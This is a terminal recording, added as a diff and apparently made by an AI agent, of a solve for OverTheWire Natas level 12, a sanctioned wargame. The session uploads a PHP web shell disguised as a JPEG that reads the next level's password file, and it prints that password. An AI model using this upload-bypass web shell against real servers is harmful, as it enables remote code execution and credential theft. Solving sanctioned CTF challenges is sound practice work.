@@ -1,0 +1,9 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469457,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L12.sh","title":"Natas L12 solve","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/index-source.html    # extension comes from client-supplied filename\r\r\n"]
+[1.073, "o", "makeRandomPathFromFilename($dir,&nbsp;$fn)\r\r\nmakeRandomPathFromFilename(\"upload\",&nbsp;$_POST[\"filename\"])\r\r\n"]
+[0.001, "o", "$ printf \"<?php echo file_get_contents(\\\"/etc/natas_webpass/natas13\\\"); ?>\" > /tmp/shell.php\r\r\n"]
+[0.001, "o", "-rw-r--r-- 1 node node 62 Oct 31 17:57 /tmp/shell.php\r\r\n$ curl -s -u natas12:<pw> -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/shell.php;type=image/jpeg\" http://natas12.natas.labs.overthewire.org/index.php\r\r\n"]
+[1.020, "o", "upload/rsdrk723wi.php\r\r\n"]
+[0.000, "o", "$ curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/<random>.php    # executes our PHP\r\r\n"]
+[1.047, "o", "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k\r\r\n"]
+[0.003, "x", "0"]
